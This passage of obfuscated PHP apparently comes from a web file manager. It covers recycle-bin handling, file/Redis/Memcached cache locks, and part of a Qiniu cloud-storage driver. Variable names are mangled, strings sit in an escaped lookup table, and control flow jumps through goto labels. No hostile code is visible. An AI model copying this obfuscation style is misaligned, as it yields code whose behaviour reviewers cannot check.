$Â¨ûšó³; foreach ($Â¨ûšó³ as $øÌ¤€˜Û) { $ƒªÌ†´å = $éò®Ó”[533] . $øÌ¤€˜Û[$éò®Ó”[193]]; self::$cacheSourceInfo[$ƒªÌ†´å] = $øÌ¤€˜Û; } return $Â¨ûšó³; } public function fileNameAuto($íàÚŒÆ…, $î Éùê§, $–Ê”Ü²¬ = REPEAT_RENAME, $ÓÍ¡Ü®¢ = false) { $ôÄ•¹Úé =& $_SERVER[Ùæõ‰Ï’]; $ï«¥ôàş = get_path_ext($î Éùê§); $ì¿çÂ± = $ï«¥ôàş ? get_path_ext_name($î Éùê§) . $ôÄ•¹Úé[2302] . $ï«¥ôàş : $î Éùê§ . $ôÄ•¹Úé[460]; $Ê°üøãñ = array($ôÄ•¹Úé[192] => $íàÚŒÆ…, $ôÄ•¹Úé[505] => 0, $ôÄ•¹Úé[32] => array($ôÄ•¹Úé[459], $ì¿çÂ±)); $§ö† = $this->field($ôÄ•¹Úé[32])->where($Ê°üøãñ)->select(); $¦¤˜ïÀÒ = array_to_keyvalue($§ö†, $ôÄ•¹Úé[12], $ôÄ•¹Úé[32]); return $this->fileNameAutoGet($¦¤˜ïÀÒ, $î Éùê§, $–Ê”Ü²¬, $ÓÍ¡Ü®¢); } public function fileNameAutoGet($³ÌÚä„Ê, $Ÿ«ÃÜ¶, $İŸ¦éÓµ, $ÄÖ¶÷Ô‚) { $°ÉãíÁ± =& $_SERVER[Ùæõ‰Ï’]; if ($İŸ¦éÓµ == REPEAT_REPLACE || !$³ÌÚä„Ê || !in_array_not_case($Ÿ«ÃÜ¶, $³ÌÚä„Ê) || $ÄÖ¶÷Ô‚ && $İŸ¦éÓµ != REPEAT_RENAME_FOLDER) { return $Ÿ«ÃÜ¶; } if ($İŸ¦éÓµ == REPEAT_SKIP) { return !1; } $¯œ§ıëŞ = $°ÉãíÁ±[10] . get_path_ext($Ÿ«ÃÜ¶); $¯œ§ıëŞ = $¯œ§ıëŞ == $°ÉãíÁ±[10] || $ÄÖ¶÷Ô‚ ? $°ÉãíÁ±[12] : $¯œ§ıëŞ; for ($òˆ«ÄÆÙ = 1; $òˆ«ÄÆÙ <= count($³ÌÚä„Ê) + 1; $òˆ«ÄÆÙ++) { $ÛÅƒ˜ŠŠ = substr($Ÿ«ÃÜ¶, 0, strlen($Ÿ«ÃÜ¶) - strlen($¯œ§ıëŞ)); $Æª®Æ‰Ë = $ÛÅƒ˜ŠŠ . "\50{$òˆ«ÄÆÙ}\51{$¯œ§ıëŞ}"; if (!in_array_not_case($Æª®Æ‰Ë, $³ÌÚä„Ê)) { return $Æª®Æ‰Ë; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\x5f\163\157\x75\x72\x63\145\x5f\x72\x65\x63\171\x63\x6c\145"; protected $dataAuto = array(array("\x63\162\145\x61\164\x65\x54\x69\x6d\145", "\164\x69\x6d\x65", "\x69\156\163\x65\162\164", "\146\x75\x6e\143\164\151\x6f\156")); public function listData($ğÅõ•Íù = false) { $ú¬›Êõë =& $_SERVER[Ùæõ‰Ï’]; $ğÅõ•Íù = $ğÅõ•Íù ? $ğÅõ•Íù : USER_ID; $îŞŒİ = $this->where(array($ú¬›Êõë[1772] => $ğÅõ•Íù))->select(); return array_to_keyvalue($îŞŒİ, $ú¬›Êõë[12], $ú¬›Êõë[193]); } public function moveToRecycle($¯Ï÷ÔóŠ) { $éÈâ²š© =& $_SERVER[Ùæõ‰Ï’]; $Æ‹òîé‰ = Model($éÈâ²š©[1430]); $¤¨´„„ = $Æ‹òîé‰->sourceInfo($¯Ï÷ÔóŠ); if (!$¤¨´„„ || $¤¨´„„[$éÈâ²š©[505]] == $éÈâ²š©[91]) { return; } $»ÏÓì†é = array($éÈâ²š©[491] => $¯Ï÷ÔóŠ, $éÈâ²š©[1772] => USER_ID, $éÈâ²š©[648] => $¤¨´„„[$éÈâ²š©[190]], $éÈâ²š©[649] => $¤¨´„„[$éÈâ²š©[569]], $éÈâ²š©[652] => $¤¨´„„[$éÈâ²š©[584]]); $this->add($»ÏÓì†é); $this->recycleMove($¯Ï÷ÔóŠ, 1); if ($¤¨´„„[$éÈâ²š©[485]] == $éÈâ²š©[91]) { $õõğ‹Êú = array($éÈâ²š©[652] => array($éÈâ²š©[612], $¤¨´„„[$éÈâ²š©[584]] . $¯Ï÷ÔóŠ . $éÈâ²š©[613])); $Æ‹òîé‰->where($õõğ‹Êú)->setField($éÈâ²š©[505], 1); } } public function clear() { $this->remove(!1); } public function remove($‡¿ßğ¬ = false, $Ä«Ş¼ˆ‰ = false) { $‚‡šÍ÷» =& $_SERVER[Ùæõ‰Ï’]; $Ä«Ş¼ˆ‰ = $Ä«Ş¼ˆ‰ ? $Ä«Ş¼ˆ‰ : USER_ID; $Ó°¨ä¬Ò = Model($‚‡šÍ÷»[1430]); $÷ÔäúÇ´ = $this->listData($Ä«Ş¼ˆ‰); $‡¿ßğ¬ = $‡¿ßğ¬ === !1 ? !1 : $‡¿ßğ¬; $˜Àéöô = array(); foreach ($÷ÔäúÇ´ as $Å¸˜¸„) { if ($‡¿ßğ¬ != !1 && !in_array($Å¸˜¸„, $‡¿ßğ¬)) { continue; } $±¾¤ˆÔğ = $Ó°¨ä¬Ò->sourceInfo($Å¸˜¸„); $Ó°¨ä¬Ò->remove($Å¸˜¸„, !1); $ÙççŞûÏ = $±¾¤ˆÔğ[$‚‡šÍ÷»[190]] . $‚‡šÍ÷»[11] . $±¾¤ˆÔğ[$‚‡šÍ÷»[569]]; $˜Àéöô[$ÙççŞûÏ] = array($‚‡šÍ÷»[648] => $±¾¤ˆÔğ[$‚‡šÍ÷»[190]], $‚‡šÍ÷»[569] => $±¾¤ˆÔğ[$‚‡šÍ÷»[569]]); $this->where(array($‚‡šÍ÷»[193] => $Å¸˜¸„))->delete(); } foreach ($˜Àéöô as $È“Ã˜‡¡) { $Ó°¨ä¬Ò->targetSpaceUpdate($È“Ã˜‡¡[$‚‡šÍ÷»[190]], $È“Ã˜‡¡[$‚‡šÍ÷»[569]]); } } public function restore($´ŞÙÙ¤ = false) { $µšÕ¤È‡ = $this->listData(); $this->_restoreSource($µšÕ¤È‡, $´ŞÙÙ¤); } public function removeUserAll($¡ƒïí¥Ù) { $this->remove(!1, $¡ƒïí¥Ù); } public function restoreItem($Š§¹Ìéğ) { $this->_restoreSource(array($Š§¹Ìéğ), array($Š§¹Ìéğ)); } private function _restoreSource($ØõúÂ«¢, $ä™Ìñ) { $ÃØ­¨Û· =& $_SERVER[Ùæõ‰Ï’]; $Ø˜Ùäñ¾ = Model($ÃØ­¨Û·[1430]); $ä™Ìñ = $ä™Ìñ == !1 ? !1 : $ä™Ìñ; if (!$ØõúÂ«¢) { return !0; } $§ŠÁÉûü = array(); foreach ($ØõúÂ«¢ as $¤†–ö´ ) { if ($ä™Ìñ != !1 && !in_array($¤†–ö´ , $ä™Ìñ)) { continue; } $ª¬”‘š¹ = $Ø˜Ùäñ¾->sourceInfo($¤†–ö´ ); $²Ó‡ôÇø = $Ø˜Ùäñ¾->sourceInfo($ª¬”‘š¹[$ÃØ­¨Û·[192]]); if ($²Ó‡ôÇø[$ÃØ­¨Û·[505]] == $ÃØ­¨Û·[91]) { continue; } $Ø˜Ùäñ¾->lockMoveStart($¤†–ö´ ); $this->recycleMove($¤†–ö´ , 0); if ($ª¬”‘š¹[$ÃØ­¨Û·[485]] == $ÃØ­¨Û·[91]) { $Ù«éÁ°Œ = array($ÃØ­¨Û·[652] => array($ÃØ­¨Û·[612], $ª¬”‘š¹[$ÃØ­¨Û·[584]] . $¤†–ö´  . $ÃØ­¨Û·[613])); $Ø˜Ùäñ¾->where($Ù«éÁ°Œ)->setField($ÃØ­¨Û·[505], 0); $this->restoreFolderChildren($¤†–ö´ , $ØõúÂ«¢); } $this->where(array($ÃØ­¨Û·[193] => $¤†–ö´ ))->delete(); $Ø˜Ùäñ¾->folderSizeReset($ª¬”‘š¹[$ÃØ­¨Û·[192]]); $§ŠÁÉûü[] = $ª¬”‘š¹[$ÃØ­¨Û·[192]]; if ($ª¬”‘š¹[$ÃØ­¨Û·[485]] == $ÃØ­¨Û·[91]) { $§ŠÁÉûü[] = $¤†–ö´ ; } $Ø˜Ùäñ¾->lockMoveEnd($¤†–ö´ ); } $Ø˜Ùäñ¾->updateModifyTime($§ŠÁÉûü); } private function restoreFolderChildren($Ø‡ÚÄõÅ, $íª­Ã¤æ) { $Ô·ô¡ =& $_SERVER[Ùæõ‰Ï’]; $øÑâ·›± = Model($Ô·ô¡[1430]); $ÁÂ°é¥œ = array($Ô·ô¡[193] => array($Ô·ô¡[7], array())); foreach ($íª­Ã¤æ as $Ïš¶·à°) { if ($Ïš¶·à° == $Ø‡ÚÄõÅ) { continue; } if (!$øÑâ·›±->isParentOf($Ø‡ÚÄõÅ, $Ïš¶·à°)) { continue; } $¤®È¬ = $øÑâ·›±->sourceInfo($Ïš¶·à°); if ($¤®È¬[$Ô·ô¡[485]] == $Ô·ô¡[91]) { $ÁÂ°é¥œ[] = array($Ô·ô¡[652] => array($Ô·ô¡[612], $¤®È¬[$Ô·ô¡[584]] . $Ïš¶·à° . $Ô·ô¡[613])); } else { $ÁÂ°é¥œ[$Ô·ô¡[193]][1][] = $Ïš¶·à°; } } if (!$ÁÂ°é¥œ[$Ô·ô¡[193]][1]) { unset($ÁÂ°é¥œ[$Ô·ô¡[193]]); } if (!$ÁÂ°é¥œ) { return; } if (is_array($ÁÂ°é¥œ[$Ô·ô¡[193]]) && is_array($ÁÂ°é¥œ[$Ô·ô¡[193]][1])) { $ÁÂ°é¥œ[$Ô·ô¡[193]][1] = array_unique($ÁÂ°é¥œ[$Ô·ô¡[193]][1]); } $ÁÂ°é¥œ[$Ô·ô¡[1091]] = $Ô·ô¡[2081]; $øÑâ·›±->where($ÁÂ°é¥œ)->setField($Ô·ô¡[505], 1); } private function recycleMove($äÒúĞ, $šî¶†°Ï = 1) { $Å±À™½ş =& $_SERVER[Ùæõ‰Ï’]; $‡ñúç‚õ = Model($Å±À™½ş[1430]); $áúÓ®Ó¶ = Model($Å±À™½ş[2303]); $“È¸óÖÖ = array($Å±À™½ş[193] => $äÒúĞ); if ($šî¶†°Ï) { $‡ñúç‚õ->where($“È¸óÖÖ)->setField($Å±À™½ş[505], 1); $áúÓ®Ó¶->eventRecycle($äÒúĞ, $Å±À™½ş[2304]); } else { $îˆ£’Á… = $‡ñúç‚õ->where($“È¸óÖÖ)->find(); $ôôĞ›É› = $îˆ£’Á…[$Å±À™½ş[485]] == $Å±À™½ş[91]; $²¼°Êˆ¢ = $‡ñúç‚õ->fileNameAuto($îˆ£’Á…[$Å±À™½ş[192]], $îˆ£’Á…[$Å±À™½ş[32]], REPEAT_RENAME_FOLDER, $ôôĞ›É›); if ($²¼°Êˆ¢ != $îˆ£’Á…[$Å±À™½ş[32]]) { $‡ñúç‚õ->rename($äÒúĞ, $²¼°Êˆ¢); } $‡ñúç‚õ->where($“È¸óÖÖ)->setField($Å±À™½ş[505], 0); $áúÓ®Ó¶->eventRecycle($äÒúĞ, $Å±À™½ş[2305]); } } } goto aÀ°Ã†ğ˜Á; C¢…¼Ò÷Ó: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $˜ÏÃ´à£ =& $_SERVER[Ùæõ‰Ï’]; $ø×ÌÔ¶ = $GLOBALS[$˜ÏÃ´à£[6]][$˜ÏÃ´à£[425]]; self::$cachePath = $ø×ÌÔ¶[$˜ÏÃ´à£[230]][$˜ÏÃ´à£[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($‰İ–¨‰, $ğÉı”­ó = 0) { $ŸÈ‡¬ÜÖ =& $_SERVER[Ùæõ‰Ï’]; $£¶Ä™Ğ  = microtime(!0); $£’æ–ù = $£¶Ä™Ğ  + $ğÉı”­ó + 0.0001; $…İßÇùĞ = rtrim(self::$cachePath, $ŸÈ‡¬ÜÖ[8]) . $ŸÈ‡¬ÜÖ[946] . md5($‰İ–¨‰) . $ŸÈ‡¬ÜÖ[943]; if (file_exists($…İßÇùĞ) && filemtime($…İßÇùĞ) && filemtime($…İßÇùĞ) < time() - 10) { @unlink($…İßÇùĞ); } do { if (file_exists($…İßÇùĞ)) { cacheLockWait(); continue; } $Ğ‘ÍÜÂ÷ = fopen($…İßÇùĞ, $ŸÈ‡¬ÜÖ[947]); if (!$Ğ‘ÍÜÂ÷) { return !1; } $¾šœ´òÛ = flock($Ğ‘ÍÜÂ÷, LOCK_EX | LOCK_NB); self::$caches[$‰İ–¨‰] = array($ŸÈ‡¬ÜÖ[948] => $Ğ‘ÍÜÂ÷, $ŸÈ‡¬ÜÖ[230] => $…İßÇùĞ); fwrite($Ğ‘ÍÜÂ÷, $£’æ–ù); clearstatcache(); if ($Ğ‘ÍÜÂ÷ && $¾šœ´òÛ) { return !0; } cacheLockWait(); } while (microtime(!0) < $£’æ–ù); $this->unlock($‰İ–¨‰); return !1; } public function lockGet($¬¡Æ¹ææ) { $Ô§×ÃÄÍ =& $_SERVER[Ùæõ‰Ï’]; $óææóÀ± = rtrim(self::$cachePath, $Ô§×ÃÄÍ[8]) . $Ô§×ÃÄÍ[946] . md5($¬¡Æ¹ææ) . $Ô§×ÃÄÍ[943]; return file_exists($óææóÀ±); } public function unlock($£•úÈóö) { $şÛïäÎ =& $_SERVER[Ùæõ‰Ï’]; $Ï‚÷ìÜÔ = self::$caches[$£•úÈóö]; if (!$Ï‚÷ìÜÔ) { return; } @flock($Ï‚÷ìÜÔ[$şÛïäÎ[948]], LOCK_UN); @fclose($Ï‚÷ìÜÔ[$şÛïäÎ[948]]); @unlink($Ï‚÷ìÜÔ[$şÛïäÎ[230]]); unset(self::$caches[$£•úÈóö]); } } class CacheLockRedis { public function lock($ôœ¸“ , $—è×ôœ¶ = 10) { $÷¥ƒÖ–± = Cache::init(); $•»ÂÍ¶é = microtime(!0) + $—è×ôœ¶; while (microtime(!0) < $•»ÂÍ¶é) { $˜ãŞ«ä´ = $÷¥ƒÖ–±->get($ôœ¸“ ); if (!$˜ãŞ«ä´) { $â¼›­¬ = $÷¥ƒÖ–±->setLock($ôœ¸“ , $•»ÂÍ¶é, $—è×ôœ¶); if ($â¼›­¬) { return !0; } } else { if ($˜ãŞ«ä´ < microtime(!0)) { $÷¥ƒÖ–±->set($ôœ¸“ , $•»ÂÍ¶é, $—è×ôœ¶ * 2); if ($÷¥ƒÖ–±->get($ôœ¸“ ) === $˜ãŞ«ä´) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($¼¤ÁƒıÙ) { return Cache::init()->get($¼¤ÁƒıÙ); } public function unlock($şÕÉ¤½ú) { return Cache::init()->remove($şÕÉ¤½ú); } } class CacheLockMemcached { public function lock($âü½˜®©, $•¬š¸á = 0) { $Ò¶ãÄ½¶ = Cache::init(); $¬³¸§èæ = microtime(!0) + $•¬š¸á; while (microtime(!0) < $¬³¸§èæ) { $¾çÎÒ¼– = $Ò¶ãÄ½¶->get($âü½˜®©); if (!$¾çÎÒ¼– || $¾çÎÒ¼– < microtime(!0)) { $Ë¬½Ÿ¯ = $Ò¶ãÄ½¶->handle->add($âü½˜®©, $¬³¸§èæ, $•¬š¸á); if ($Ë¬½Ÿ¯) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($¢˜ÇÀñ) { return Cache::init()->get($¢˜ÇÀñ); } public function unlock($ú’ÙÅ€Ë) { return Cache::init()->remove($ú’ÙÅ€Ë); } } goto C°ã‘›Íª´; B’ÔŠ®òÉ›: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($Óğ©Ë§) { parent::__construct(); require_once SDK_DIR . $_SERVER[Ùæõ‰Ï’][1539]; $this->_init($Óğ©Ë§); } public function _init($ÄÕÌ§Êª) { $…ÓÏ»± =& $_SERVER[Ùæõ‰Ï’]; $this->config = $ÄÕÌ§Êª; foreach ($ÄÕÌ§Êª as $ÜĞÆ“½« => $‹ïÍÅÔÌ) { if (isset($this->{$ÜĞÆ“½«})) { $this->{$ÜĞÆ“½«} = $‹ïÍÅÔÌ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($…ÓÏ»±[1540] . LNG($…ÓÏ»±[1475])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($äô‰¹œş, $³¦Ñ©¯ù = '', $äüçËÉ = REPEAT_RENAME) { if ($this->setContent($äô‰¹œş, $³¦Ñ©¯ù)) { return $this->getPathOuter($äô‰¹œş); } return !1; } public function mkdir($‹ø—÷Ÿ, $£“ƒ±ƒ = REPEAT_SKIP) { $©œÌä› =& $_SERVER[Ùæõ‰Ï’]; $ö–½¼ã— = trim($‹ø—÷Ÿ, $©œÌä›[8]); if ($this->_isFolder($ö–½¼ã—)) { return $this->getPathOuter($ö–½¼ã—); } $‹ø—÷Ÿ = $ö–½¼ã— . $©œÌä›[8]; $øÈ–‘ğ¦ = get_path_this($ö–½¼ã—); $óñ‰ˆ¼ø = $‹ø—÷Ÿ . $øÈ–‘ğ¦; if (!$this->mkfile($óñ‰ˆ¼ø)) { return !1; } if (!$this->moveFile($óñ‰ˆ¼ø, $‹ø—÷Ÿ)) { $this->delFile($óñ‰ˆ¼ø); return !1; } return $this->getPathOuter($ö–½¼ã—); } public function copyFile($ŸºüÒ®û, $Ø¥İæ‹Ö) { $¢äÕ¤•“ = $this->bucketManager->copy($this->bucket, $ŸºüÒ®û, $this->bucket, $Ø¥İæ‹Ö, !0); return $¢äÕ¤•“ ? !1 : $this->getPathOuter($Ø¥İæ‹Ö); } public function moveFile($«é²úÑ, $İŠÂÑÛ) { $ÛüÁá = $this->bucketManager->move($this->bucket, $«é²úÑ, $this->bucket, $İŠÂÑÛ, !0); return $ÛüÁá ? !1 : $this->getPathOuter($İŠÂÑÛ); } public function delFile($ÍœøğÀ²) { if (!$this->exist($ÍœøğÀ²)) { return !0; } $è‚·«Æ = $this->bucketManager->delete($this->bucket, $ÍœøğÀ²); return $è‚·«Æ ? !1 : !0; } public function delFolder($ÇË÷äëÏ) { $¢Ô°Úü¼ =& $_SERVER[Ùæõ‰Ï’]; if (!$this->exist($ÇË÷äëÏ)) { return !0; } $this->listItemCache = !1; $†¯‘Æ“¤ = $this->fileList($ÇË÷äëÏ); $this->listItemCache = !0; $ö‡İø§ä = trim($ÇË÷äëÏ, $¢Ô°Úü¼[8]) . $¢Ô°Úü¼[8]; if (!empty($ÇË÷äëÏ) && $ÇË÷äëÏ !== $¢Ô°Úü¼[228] && !in_array($ö‡İø§ä, $†¯‘Æ“¤[$¢Ô°Úü¼[85]])) { $†¯‘Æ“¤[$¢Ô°Úü¼[85]][] = $ö‡İø§ä; } $è†ğğƒ  = $this->delByBatch($†¯‘Æ“¤[$¢Ô°Úü¼[86]]); if (!$è†ğğƒ ) { return !1; } $è†ğğƒ  = $this->delByBatch($†¯‘Æ“¤[$¢Ô°Úü¼[85]]); if (!$è†ğğƒ ) { return !1; } return $this->delFile($ö‡İø§ä); } private function delByBatch($ÌŒª¨µ°) { foreach (array_chunk($ÌŒª¨µ°, 1000) as $îìáÏ¼Ø) { $Ö²÷ª·Ó = $this->bucketManager->buildBatchDelete($this->bucket, $îìáÏ¼Ø); list($ş†“šàø, $É—ù¯ç) = $this->bucketManager->batch($Ö²÷ª·Ó); if ($É—ù¯ç) { return !1; } } return !0; } public function rename($ÊÂïìÅø, $Ğúë²“Í) { return $this->renameObject($ÊÂïìÅø, $Ğúë²“Í); } public function fileInfo($Ãñà„Ø, $ˆ•Ãõ™‚ = false, $öÑ˜£—ô = array()) { $òĞ†çş =& $_SERVER[Ùæõ‰Ï’]; $¹Ä¡ Öë = array($òĞ†çş[32] => $this->pathThis($Ãñà„Ø), $òĞ†çş[87] => $this->getPathOuter($òĞ†çş[8] . $Ãñà„Ø), $òĞ†çş[33] => $òĞ†çş[230], $òĞ†çş[79] => isset($öÑ˜£—ô[$òĞ†çş[1541]]) ? $öÑ˜£—ô[$òĞ†çş[1541]] : 0, $òĞ†çş[169] => $this->ext($Ãñà„Ø)); if ($ˆ•Ãõ™‚) { return $¹Ä¡ Öë; } $¹Ä¡ Öë[$òĞ†çş[231]] = $¹Ä¡ Öë[$òĞ†çş[88]] = 0; $¹Ä¡ Öë[$òĞ†çş[232]] = $¹Ä¡ Öë[$òĞ†çş[233]] = !0; if (empty($öÑ˜£—ô)) { $öÑ˜£—ô = $this->objectMeta($Ãñà„Ø); if (!$öÑ˜£—ô) { return $¹Ä¡ Öë; } } if (isset($öÑ˜£—ô[$òĞ†çş[234]]) && $öÑ˜£—ô[$òĞ†çş[234]]) { $¹Ä¡ Öë[$òĞ†çş[235]] = $öÑ˜£—ô[$òĞ†çş[234]]; } if (isset($öÑ˜£—ô[$òĞ†çş[245]]) && $öÑ˜£—ô[$òĞ†çş[245]]) { $¹Ä¡ Öë[$òĞ†çş[235]] = $öÑ˜£—ô[$òĞ†çş[245]]; } if (isset($öÑ˜£—ô[$òĞ†çş[1542]])) { $¹Ä¡ Öë[$òĞ†çş[88]] = substr($öÑ˜£—ô[$òĞ†çş[1542]] . $òĞ†çş[12], 0, 10); } if (isset($öÑ˜£—ô[$òĞ†çş[1541]])) { $¹Ä¡ Öë[$òĞ†çş[79]] = $öÑ˜£—ô[$òĞ†çş[1541]]; } return $¹Ä¡ Öë; } public function folderInfo($Ñ÷¤ğ•â, $ş‡¸ÓŞÚ = false) { $Áœ¨¤î‡ =& $_SERVER[Ùæõ‰Ï’]; $°¥µ€ = array($Áœ¨¤î‡[32] => $this->pathThis($Ñ÷¤ğ•â), $Áœ¨¤î‡[87] => $this->getPathOuter($Áœ¨¤î‡[8] . $Ñ÷¤ğ•â), $Áœ¨¤î‡[33] => $Áœ¨¤î‡[78]); if ($ş‡¸ÓŞÚ) { return $°¥µ€; } $°¥µ€[$Áœ¨¤î‡[231]] = $°¥µ€[$Áœ¨¤î‡[88]] = 0; $°¥µ€[$Áœ¨¤î‡[232]] = $°¥µ€[$Áœ¨¤î‡[233]] = !0; $Ñ÷¤ğ•â = rtrim($Ñ÷¤ğ•â, $Áœ¨¤î‡[8]) . $Áœ¨¤î‡[8]; $îŒ˜—ş£ = $this->objectMeta($Ñ÷¤ğ•â); if (isset($îŒ˜—ş£[$Áœ¨¤î‡[1542]])) { $°¥µ€[$Áœ¨¤î‡[88]] = substr($îŒ˜—ş£[$Áœ¨¤î‡[1542]] . $Áœ¨¤î‡[12], 0, 10); } return $°¥µ€; } public function listPath($¶ÆÓ¾Éë, $›®ĞÑü¸ = false) { $Æãîáø =& $_SERVER[Ùæõ‰Ï’]; $Æô’¸úµ = $this->fileList($¶ÆÓ¾Éë, $Æãîáø[8], !0); foreach ($Æô’¸úµ[$Æãîáø[85]] as $¡ÂŠÇß´ => $Ê¥Šµãî) { $Æô’¸úµ[$Æãîáø[85]][$¡ÂŠÇß´] = $this->folderInfo($Ê¥Šµãî, $›®ĞÑü¸); } foreach ($Æô’¸úµ[$Æãîáø[86]] as $¡ÂŠÇß´ => $Ê¥Šµãî) { $Æô’¸úµ[$Æãîáø[86]][$¡ÂŠÇß´] = $this->fileInfo($Ê¥Šµãî[$Æãîáø[97]], $›®ĞÑü¸, $Ê¥Šµãî); } return $Æô’¸úµ; } public function has($ˆÜã», $öøÁÄ¼ = false, $ùº¨ÌÎé = true) { $İÕÅğÌ =& $_SERVER[Ùæõ‰Ï’]; $ˆÜã» = trim($ˆÜã», $İÕÅğÌ[8]); $Âß´ùıŒ = empty($ˆÜã») && $ˆÜã» !== $İÕÅğÌ[228] ? $İÕÅğÌ[12] : $ˆÜã» . $İÕÅğÌ[8]; $ƒÖş‡§ = $İÕÅğÌ[12]; $µ ›’Æ = 500; $Ì†´ÄÎï = $İÕÅğÌ[8]; $àªŠËœğ = $Íğ–Å÷¸ = 0; while (!0) { check_abort(); list($éÖìµ°Ô, $ˆöò®øœ) = $this->bucketManager->listFiles($this->bucket, $Âß´ùıŒ, $ƒÖş‡§, $µ ›’Æ, $Ì†´ÄÎï); if ($ˆöò®øœ) { break; } $ƒÖş‡§ = array_key_exists($İÕÅğÌ[1487], $éÖìµ°Ô) ? $ƒÖş‡§ = $éÖìµ°Ô[$İÕÅğÌ[1543]] : $İÕÅğÌ[12]; if ($öøÁÄ¼) { if (!empty($éÖìµ°Ô[$İÕÅğÌ[1544]])) { $àªŠËœğ += count($éÖìµ°Ô[$İÕÅğÌ[1544]]); } if (!empty($éÖìµ°Ô[$İÕÅğÌ[1545]])) { $Íğ–Å÷¸ += count($éÖìµ°Ô[$İÕÅğÌ[1545]]); } if ($ƒÖş‡§ === $İÕÅğÌ[12]) { break; } continue; } if ($ùº¨ÌÎé) { if (!empty($éÖìµ°Ô[$İÕÅğÌ[1544]])) { return !0; } } else { if (!empty($éÖìµ°Ô[$İÕÅğÌ[1545]])) { return !0; } } if ($ƒÖş‡§ === $İÕÅğÌ[12]) { break; } } if ($öøÁÄ¼) { return array($İÕÅğÌ[239] => $àªŠËœğ, $İÕÅğÌ[240] => $Íğ–Å÷¸); } return !1; } public function listAll($†Ô“²ª) { $·‰½ÕŠ =& $_SERVER[Ùæõ‰Ï’]; $Âáãø¸ = $this->fileList($†Ô“²ª, $·‰½ÕŠ[12], !0); $öŠßĞñ‰ = array_to_keyvalue($Âáãø¸[$·‰½ÕŠ[86]], $·‰½ÕŠ[32]); foreach ($Âáãø¸[$·‰½ÕŠ[85]] as $¸™ıŸ”¸) { if (is_string($¸™ıŸ”¸)) { $öŠßĞñ‰[$¸™ıŸ”¸] = array($·‰½ÕŠ[79] => 0); } } return $this->listAllFiles($†Ô“²ª, $öŠßĞñ‰); } private function fileList($şÚÀ•¤€, $Ì¾ê¬ˆ = '', $ÅÂÇË‰Á = 0) { $òÌÔÉÄ´ =& $_SERVER[Ùæõ‰Ï’]; $şÚÀ•¤€ = trim($şÚÀ•¤€, $òÌÔÉÄ´[8]); $¨ÈßªÔ© = empty($şÚÀ•¤€) && $şÚÀ•¤€ !== $òÌÔÉÄ´[228] ? $òÌÔÉÄ´[12] : $şÚÀ•¤€ . $òÌÔÉÄ´[8]; $Úõ²Ñ‘‡ = $òÌÔÉÄ´[12]; $¢À—‘ĞŸ = 1000; $ÅÙôÖÉƒ = $¢¯¢úÆ® = array(); while (!0) { check_abort(); list($£ĞÑ¦«, $ëåê£Š) = $this->bucketManager->listFiles($this->bucket, $¨ÈßªÔ©, $Úõ²Ñ‘‡, $¢À—‘ĞŸ, $Ì¾ê¬ˆ); if ($ëåê£Š) { break; } $Úõ²Ñ‘‡ = array_key_exists($òÌÔÉÄ´[1487], $£ĞÑ¦«) ? $Úõ²Ñ‘‡ = $£ĞÑ¦«[$òÌÔÉÄ´[1543]] : $òÌÔÉÄ´[12]; $ ™ßâ¨æ = isset($£ĞÑ¦«[$òÌÔÉÄ´[1544]]) ? $£ĞÑ¦«[$òÌÔÉÄ´[1544]] : array(); $­âµ“şÇ = isset($£ĞÑ¦«[$òÌÔÉÄ´[1545]]) ? $£ĞÑ¦«[$òÌÔÉÄ´[1545]] : array(); foreach ($ ™ßâ¨æ as $–µù›äÅ) { if ($–µù›äÅ[$òÌÔÉÄ´[97]] == $¨ÈßªÔ©) { continue; } $íÙÈÈçø = $–µù›äÅ[$òÌÔÉÄ´[97]]; $ØáÂÆµ¨ = $–µù›äÅ[$òÌÔÉÄ´[1541]]; $–µù›äÅ[$òÌÔÉÄ´[79]] = $ØáÂÆµ¨; $æØèÆø® = $ØáÂÆµ¨ == 0 && substr($íÙÈÈçø, strlen($íÙÈÈçø) - 1, 1) == $òÌÔÉÄ´[8] ? !0 : !1; $this->cacheMethodInfoSet($íÙÈÈçø, $æØèÆø®, $–µù›äÅ); if ($æØèÆø®) { $ÅÙôÖÉƒ[] = $íÙÈÈçø; continue; } $¢¯¢úÆ®[] = $ÅÂÇË‰Á ? $–µù›äÅ : $íÙÈÈçø; } foreach ($­âµ“şÇ as $íÙÈÈçø) { if ($íÙÈÈçø == $¨ÈßªÔ©) { continue; } $ÅÙôÖÉƒ[] = $íÙÈÈçø; $this->cacheMethodInfoSet($íÙÈÈçø, !0); } if ($Úõ²Ñ‘‡ === $òÌÔÉÄ´[12]) { break; } } $this->cacheMethodInfoSet($şÚÀ•¤€, !0); return array($òÌÔÉÄ´[85] => $ÅÙôÖÉƒ, $òÌÔÉÄ´[86] => $¢¯¢úÆ®); } public function canRead($‚Üğøûı) { return $this->exist($‚Üğøûı) ? !0 : !1; } public function canWrite($§‹æ¨Ï) { return $this->exist($§‹æ¨Ï) ? !0 : !1; } public function getContent($Ê·ÛæÃ) { return $this->fileSubstr($Ê·ÛæÃ, 0, -1); } public function setContent($´ø´ØàÊ, $¿Ø¥è³õ = '') { $ÚÑşÓ¹Ì = $this->tempFile($this->pathThis($´ø´ØàÊ)); file_put_contents($ÚÑşÓ¹Ì, $¿Ø¥è³õ); if ($this->upload($´ø´ØàÊ, $ÚÑşÓ¹Ì)) { $this->tempFileRemve($ÚÑşÓ¹Ì); return !0; } return !1; } public function refreshUrls($‹åôÉä¤) { $òÆı‰Ÿ° =& $_SERVER[Ùæõ‰Ï’]; $·ù¾ÛÛæ = array(); if (is_array($‹åôÉä¤)) { foreach ($‹åôÉä¤ as 